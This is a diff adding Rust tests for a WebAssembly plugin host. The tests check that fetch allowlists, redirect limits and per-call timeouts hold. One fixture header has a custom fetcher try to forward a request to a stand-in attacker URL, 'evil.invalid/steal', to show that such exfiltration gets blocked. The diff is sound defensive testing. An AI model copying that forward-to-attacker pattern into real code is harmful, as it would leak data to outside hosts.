@@ -7,15 +7,22 @@
 
 use std::path::{Path, PathBuf};
 use std::sync::Arc;
+use std::sync::atomic::{AtomicU16, Ordering};
 use std::time::Duration;
 
 use tempfile::TempDir;
 use tokio_util::sync::CancellationToken;
 
+use super::engine::HostEngine;
+use super::engine::source_world::filimon::plugin::types;
+use super::fetch::{Allowlist, FetchPolicy, FetchRoute};
+use super::instance::WasmtimeFactory;
+use super::loader::{load_fetcher, load_source};
+use super::once::poll_once;
 use super::sink::{ItemSink, SinkError, SinkRecord, VecSink};
 use super::testing::{
-    LogCapture, Reply, SeenRequest, TestHttpServer, TestSource, fixture_wasm, load_test_registry,
-    write_registry,
+    self, LogCapture, Reply, SeenRequest, TestHttpServer, TestSource, fixture_wasm,
+    load_test_registry, write_registry,
 };
 use super::{Host, HostOptions, HostReport};
 use crate::models::SourceType;
@@ -593,4 +600,266 @@ async fn wasm_changing_the_assigned_fetcher_changes_who_serves_the_request() {
     assert_eq!(seen.len(), 1, "{seen:?}");
     assert_eq!(seen[0].method, "GET");
     assert_eq!(seen[0].target, "/swap");
+}
+
+// ── FETCH-02: The Allowlist And The Timeout Hold Whoever Is In Charge ─────────
+//
+// The stub fetcher doubles as the "custom fetcher": a request header,
+// `x-stub-mode`, makes it spin or forward to another url. These tests drive a
+// route and the real stub source directly, without a registry.
+
+/// A route over the fetcher component at `wasm`, with its own allowlist and
+/// deadline.
+fn route_over(
+    engine: &HostEngine,
+    alias: &str,
+    wasm: &Path,
+    allow: &[&str],
+    timeout: Duration,
+) -> Arc<FetchRoute> {
+    let pre = load_fetcher(alias, wasm, engine).expect("fetcher loads");
+    let policy = FetchPolicy::new("stub", Allowlist::new(allow), timeout);
+    Arc::new(FetchRoute::new(
+        alias,
+        Arc::new(pre),
+        engine.engine().clone(),
+        Arc::new(policy),
+        engine.egress(),
+    ))
+}
+
+/// Polls the real stub source once, with `route` serving its `fetch`. Returns
+/// everything that was logged meanwhile and how long the poll itself took
+/// (compiling the component is not part of that time).
+async fn poll_timed(
+    engine: &HostEngine,
+    route: Option<Arc<FetchRoute>>,
+    settings: &str,
+) -> (String, Duration) {
+    let path = fixture_wasm("stub-source", "stub_source.wasm");
+    let pre = load_source("stub", &path, engine).expect("source loads");
+    let factory = WasmtimeFactory::new(engine.engine().clone(), pre).with_route(route);
+    let mut spec = testing::spec("stub", 60, 60, 3600, 2.0);
+    spec.settings_toml = settings.to_string();
+    let (logs, _guard) = LogCapture::start();
+    let started = std::time::Instant::now();
+    poll_once(&spec, &factory, None)
+        .await
+        .expect("the source polls");
+    (logs.text(), started.elapsed())
+}
+
+/// Like [`poll_timed`], for a test that does not look at the time.
+async fn poll_logs(engine: &HostEngine, route: Option<Arc<FetchRoute>>, settings: &str) -> String {
+    poll_timed(engine, route, settings).await.0
+}
+
+fn stub_fetcher_wasm() -> PathBuf {
+    fixture_wasm("stub-fetcher", "stub_fetcher.wasm")
+}
+
+fn http_fetcher_wasm() -> PathBuf {
+    fixture_wasm("http-fetcher", "http_fetcher.wasm")
+}
+
+/// A loopback server whose handler also learns the server's own port.
+async fn start_with_port(
+    handler: impl Fn(&SeenRequest, u16) -> Reply + Send + Sync + 'static,
+) -> TestHttpServer {
+    let port = Arc::new(AtomicU16::new(0));
+    let shared = Arc::clone(&port);
+    let server =
+        TestHttpServer::start(move |seen| handler(seen, shared.load(Ordering::SeqCst))).await;
+    port.store(server.port(), Ordering::SeqCst);
+    server
+}
+
+fn get(url: &str) -> types::Request {
+    types::Request {
+        method: types::Method::Get,
+        url: url.to_string(),
+        headers: vec![],
+        body: None,
+    }
+}
+
+#[tokio::test]
+#[ignore = "needs plugin fixtures: see plugins/README.md"]
+async fn wasm_default_fetcher_is_refused_a_host_outside_the_allowlist() {
+    let server = TestHttpServer::start(|_| Reply::ok("never asked")).await;
+    let engine = HostEngine::new().expect("engine");
+    let route = route_over(
+        &engine,
+        "http",
+        &http_fetcher_wasm(),
+        &["127.0.0.1"],
+        Duration::from_secs(5),
+    );
+    // The same server, under a name the source may not reach.
+    let settings = format!(
+        "greeting = \"hi\"\nfetch_url = \"{}\"\n",
+        server.localhost_url("/x")
+    );
+
+    let text = poll_logs(&engine, Some(Arc::clone(&route)), &settings).await;
+
+    assert!(text.contains("init fetch failed: FetchError::Denied("), "{text}");
+    assert!(server.seen().is_empty(), "the server saw {:?}", server.seen());
+    assert_eq!(route.calls(), 0, "a denied host starts no fetcher");
+}
+
+#[tokio::test]
+#[ignore = "needs plugin fixtures: see plugins/README.md"]
+async fn wasm_custom_fetcher_cannot_send_outside_the_allowlist() {
+    let engine = HostEngine::new().expect("engine");
+    let route = route_over(
+        &engine,
+        "stub-fetcher",
+        &stub_fetcher_wasm(),
+        &["example.invalid"],
+        Duration::from_secs(5),
+    );
+    // The source's own request is allowed; the fetcher then tries to `send`
+    // somewhere else.
+    let settings = "greeting = \"hi\"\n\
+                    fetch_url = \"http://example.invalid/ok\"\n\
+                    fetch_headers = { \"x-stub-mode\" = \"forward:http://evil.invalid/steal\" }\n";
+
+    let text = poll_logs(&engine, Some(Arc::clone(&route)), settings).await;
+
+    let ran = text.find("stub fetch:").unwrap_or_else(|| panic!("the fetcher ran: {text}"));
+    let denied = text
+        .find("init fetch failed: FetchError::Denied(")
+        .unwrap_or_else(|| panic!("the fetcher's send was denied: {text}"));
+    assert!(ran < denied, "{text}");
+    assert!(text.contains("evil.invalid"), "{text}");
+    assert!(!text.contains("init fetch status"), "{text}");
+    assert_eq!(route.calls(), 1);
+}
+
+#[tokio::test]
+#[ignore = "needs plugin fixtures: see plugins/README.md"]
+async fn wasm_default_fetcher_is_denied_a_redirect_outside_the_allowlist() {
+    let server = start_with_port(|seen, port| match seen.target.as_str() {
+        "/r" => Reply::redirect(302, &format!("http://localhost:{port}/x")),
+        _ => Reply::ok("the second host was contacted"),
+    })
+    .await;
+    let engine = HostEngine::new().expect("engine");
+    let route = route_over(
+        &engine,
+        "http",
+        &http_fetcher_wasm(),
+        &["127.0.0.1"],
+        Duration::from_secs(5),
+    );
+    let settings = format!(
+        "greeting = \"hi\"\nfetch_url = \"{}\"\n",
+        server.url("/r")
+    );
+
+    let text = poll_logs(&engine, Some(route), &settings).await;
+
+    assert!(text.contains("init fetch failed: FetchError::Denied("), "{text}");
+    assert!(text.contains("localhost"), "{text}");
+    let targets: Vec<String> = server.seen().into_iter().map(|s| s.target).collect();
+    assert_eq!(targets, vec!["/r".to_string()], "the second host was never contacted");
+}
+
+#[tokio::test]
+#[ignore = "needs plugin fixtures: see plugins/README.md"]
+async fn wasm_slow_server_times_out_through_the_default_fetcher() {
+    let server =
+        TestHttpServer::start(|_| Reply::ok("late").delayed(Duration::from_secs(5))).await;
+    let engine = HostEngine::new().expect("engine");
+    let route = route_over(
+        &engine,
+        "http",
+        &http_fetcher_wasm(),
+        &["127.0.0.1"],
+        Duration::from_millis(400),
+    );
+    let settings = format!(
+        "greeting = \"hi\"\nfetch_url = \"{}\"\n",
+        server.url("/slow")
+    );
+
+    let (text, elapsed) = poll_timed(&engine, Some(route), &settings).await;
+
+    assert!(text.contains("init fetch failed: FetchError::Timeout"), "{text}");
+    assert!(
+        elapsed < Duration::from_secs(3),
+        "the poll took {elapsed:?}, far longer than the 400 ms deadline"
+    );
+}
+
+#[tokio::test]
+#[ignore = "needs plugin fixtures: see plugins/README.md"]
+async fn wasm_spinning_custom_fetcher_times_out_and_the_route_survives() {
+    let engine = HostEngine::new().expect("engine");
+    let route = route_over(
+        &engine,
+        "stub-fetcher",
+        &stub_fetcher_wasm(),
+        &["example.invalid"],
+        Duration::from_millis(400),
+    );
+
+    // A fetcher that never returns is cut off at the source's deadline.
+    let spinning = "greeting = \"hi\"\n\
+                    fetch_url = \"http://example.invalid/spin\"\n\
+                    fetch_headers = { \"x-stub-mode\" = \"spin\" }\n";
+    let (text, elapsed) = poll_timed(&engine, Some(Arc::clone(&route)), spinning).await;
+    assert!(text.contains("init fetch failed: FetchError::Timeout"), "{text}");
+    assert!(
+        elapsed < Duration::from_secs(3),
+        "the spinning fetcher held the poll for {elapsed:?}"
+    );
+
+    // The interrupted call is just dropped: the same route serves the next call.
+    let normal = "greeting = \"hi\"\nfetch_url = \"http://example.invalid/after\"\n";
+    let text = poll_logs(&engine, Some(Arc::clone(&route)), normal).await;
+    assert!(text.contains("init fetch status 200"), "{text}");
+    assert_eq!(route.calls(), 2);
+}
+
+#[tokio::test]
+#[ignore = "needs plugin fixtures: see plugins/README.md"]
+async fn wasm_a_slow_call_does_not_time_out_a_fast_concurrent_call() {
+    let server = TestHttpServer::start(|seen| match seen.target.as_str() {
+        "/slow" => Reply::ok("late").delayed(Duration::from_secs(3)),
+        _ => Reply::ok("quick"),
+    })
+    .await;
+    let engine = HostEngine::new().expect("engine");
+    let route = route_over(
+        &engine,
+        "http",
+        &http_fetcher_wasm(),
+        &["127.0.0.1"],
+        Duration::from_secs(1),
+    );
+
+    let started = std::time::Instant::now();
+    let slow = async {
+        let result = route.fetch(get(&server.url("/slow"))).await;
+        (result, started.elapsed())
+    };
+    let fast = async {
+        let result = route.fetch(get(&server.url("/fast"))).await;
+        (result, started.elapsed())
+    };
+    let ((slow_result, slow_done), (fast_result, fast_done)) = tokio::join!(slow, fast);
+
+    // Each call carries its own deadline: the slow one runs out, the fast one
+    // is answered at once and is not held back or cut short by it.
+    assert!(
+        matches!(slow_result, Err(types::FetchError::Timeout)),
+        "{slow_result:?}"
+    );
+    let fast_response = fast_result.expect("the fast call succeeds");
+    assert_eq!(fast_response.status, 200);
+    assert!(fast_done < slow_done, "fast {fast_done:?}, slow {slow_done:?}");
+    assert!(fast_done < Duration::from_millis(800), "fast took {fast_done:?}");
+    assert!(slow_done < Duration::from_millis(2500), "slow took {slow_done:?}");
 }
